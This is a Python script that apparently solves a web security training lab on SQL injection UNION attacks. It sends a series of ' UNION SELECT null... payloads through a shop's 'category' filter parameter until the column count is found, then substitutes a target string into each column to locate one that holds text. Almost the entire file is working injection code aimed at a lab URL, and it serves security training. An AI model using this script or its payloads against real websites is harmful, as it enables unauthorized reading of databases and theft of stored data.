##############################################################################
#
# Lab: SQL injection UNION attack, finding a column containing text
#
# Hack Steps: 
#      1. Inject payload into 'category' query parameter to determine
#         the number of columns
#      2. Add one additional null column at a time
#      3. Repeat this process, increasing the number of columns until you
#         receive a valid response
#      4. After determining the number of columns, replace each column with
#         the desired text one at a time.
#      5. Repeat this process until you receive a valid response.
#
##############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0afa00d704b6f99080e88f9b00730007.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")

    main_page = fetch("/")

    target_text = re.findall("Make the database retrieve the string: '(.*)'", main_page.text)[0]

    for counter in range(1, 10):
        nulls = "null, " * counter
        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
        
        print(Fore.WHITE + f"❯❯ Trying payload: {payload}")
        
        injection_response = fetch(f"/filter?category={payload}")

        if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response):
            print(Fore.WHITE + "⦗#⦘ Number of columns: " + Fore.GREEN + str(counter))
            
            for column in range(1, counter+1):
                # Replace each null with the target text one at a time
                new_payload = payload.replace("null", f"'{target_text}'", column).replace(f"'{target_text}'", "null", column-1)
    
                print(Fore.WHITE + f"❯❯ Trying payload: {new_payload}")
                
                injection_response = fetch(f"/filter?category={new_payload}")
        
                if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response):
                    print(Fore.WHITE + "⦗#⦘ the column containing text: " + Fore.GREEN + str(column))
                    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
                    
                    break
                
                else:
                    continue
            
            break
        else:
            continue
    
def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)

def text_not_exist_in_response(text, response):
    result =  re.findall(text, response.text)
    if len(result) == 0:
        return True
    else:
        return False 

if __name__ == "__main__":
    main()